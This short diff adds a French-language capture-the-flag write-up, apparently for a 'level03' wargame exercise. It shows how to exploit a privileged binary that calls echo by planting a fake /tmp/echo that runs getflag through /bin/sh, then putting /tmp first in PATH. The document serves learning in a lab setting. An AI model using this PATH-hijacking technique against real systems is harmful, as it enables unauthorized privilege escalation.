@@ -1,0 +1,16 @@
+Il y a un executable dans le home de l'user level03,
+quand on l'execute, cela nous donne Exploit me.
+On peut utiliser strings pour chercher des chaines de caracteres dans l'executable
+
+parmis d'autre chose on peut voir un appel a echo pour afficher Exploit me
+
+on va creer un faux echo pour lancer get flag a la place de print exploit me
+
+echo "/bin/sh -c 'getflag'" > /tmp/echo,
+on donne les droits a notre echo:
+
+chmod 755 /tmp/echo
+
+on ajoute notre echo dans le PATH, 
+
+export PATH=/tmp:$PATH
